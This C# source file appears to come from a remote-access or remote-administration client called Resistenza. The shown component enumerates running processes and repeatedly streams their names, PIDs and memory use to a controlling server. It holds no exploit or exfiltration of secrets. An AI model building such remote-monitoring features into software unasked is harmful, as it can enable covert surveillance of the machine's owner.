using Resistenza.Common.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Management;
using System.Text;
using System.Threading.Tasks;


using Resistenza.Common.Packets.Logic;
using Resistenza.Client.Logic;
using System.Collections;
using NAudio.Mixer;
using System.Xml.Linq;

namespace Resistenza.Common.Packets.Task_Manager
{
    public class RunningProcessesRequest
    {

        public string Type { get; set; }

        public RunningProcessesRequest()
        {

            Type = this.GetType().ToString();
        }

        private SemaphoreSlim _ServerStreamLock;
       
        private SecureStream _Server;
       
        

        public async Task HandleAsync(SecureStream Server, CancellationTokenSourceWithId cancellationTokenSourceWithId, SemaphoreSlim Lock)
        {
            _ServerStreamLock = Lock;
            _Server = Server;

            
            while (true)
            {
                try
                {
                    await SendProcessesAsync(cancellationTokenSourceWithId);                    
                }
                catch (TaskCanceledException)
                {
                    cancellationTokenSourceWithId.Token.ThrowIfCancellationRequested();
                }
                
            }
            
            
     
        }

  
        private async Task SendProcessesAsync(CancellationTokenSourceWithId CancelOperation)
        {
           //non è ibiza, festivalbar...

            bool IsFirst = true;
            int Count = 0;
            Process[] AllProcesses = Process.GetProcesses();

            foreach (Process Entry in AllProcesses)
            {
                if(CancelOperation.Token.IsCancellationRequested && CancelOperation.IdOfTaskToBeCancelled == TasksIds.SEND_PROCESSES_CHANGE)
                {
                    CancelOperation.Token.ThrowIfCancellationRequested();
                }

                Count++;

                //uso di memoria in megabytes 

                var RamCounter = new PerformanceCounter("Process", "Working Set - Private", Entry.ProcessName, true);
                double memsize = Math.Round((RamCounter.NextValue() / (int)(1048576)), 1);

                var CpuCounter = new PerformanceCounter("Process", "% Processor Time", Entry.ProcessName, true);
                double cpu_usage = Math.Round(CpuCounter.NextValue() / Environment.ProcessorCount, 2);

                ProcessInfo Info = new ProcessInfo();
                Info.Name = Entry.ProcessName;        
                Info.MemoryUsedInMegabytes = memsize;
                Info.PID = Entry.Id;
                //Info.ProcessIcon = IconToByteArray(ExtractIconFromProcessName(x.Value));

                RunningProcessesResponse runningProcessesResponse = new RunningProcessesResponse()
                {
                    Entry = Info,
                    IsFirst = IsFirst,
                    IsLast = (Count == AllProcesses.Count())
                };

                await _ServerStreamLock.WaitAsync();
                await _Server.SendPacketAsync(runningProcessesResponse);
                _ServerStreamLock.Release();
              

                if (IsFirst)
                {
                    IsFirst = false;
                }
            }

           

        }

        private Icon? ExtractIconFromProcessName(string ProcessName)
        {
            Process Proc = new Process();
            string ExecutablePath = string.Empty;
            try
            {
                 Proc = Process.GetProcessesByName(ProcessName)[0];
                 ExecutablePath = Proc.MainModule.FileName;
            }
            catch (System.ComponentModel.Win32Exception)
            {
                return null;
            }
            
            return Icon.ExtractAssociatedIcon(@$"{ExecutablePath}");

           
           
        }

        private byte[]? IconToByteArray(Icon icon)
        {
            if(icon == null)
            {
                return null;
            }

           
            
            byte[] byteArray;
            using (MemoryStream stream = new MemoryStream())
            {
                icon.Save(stream); // Save icon to stream
                byteArray = stream.ToArray(); // Convert stream to byte array
            }
            return byteArray;
        }
        


        
    }

    public class ProcessInfo
    {
        public string? Name { get; set; }
        public byte[]? ProcessIcon { get; set; }
        public double MemoryUsedInMegabytes { get; set; }
        public double CpuUsedInPercentage { get; set; }
        public int PID { get; set; }

    }
}
